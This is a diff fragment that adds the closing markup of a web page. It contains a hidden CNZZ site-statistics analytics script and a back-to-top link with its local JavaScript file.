+
+
+
+
+
+
+  <div style="display: none;">
+    <script src="https://s95.cnzz.com/z_stat.php?id=1260716016&web_id=1260716016" language="JavaScript"></script>
+  </div>
+
+
+
+
+
+
+
+
+  </div>
+
+  <a id="rocket" href="#top" class=""></a>
+  <script type="text/javascript" src="/js/totop.js" async=""></script>
+</body>
+</html>
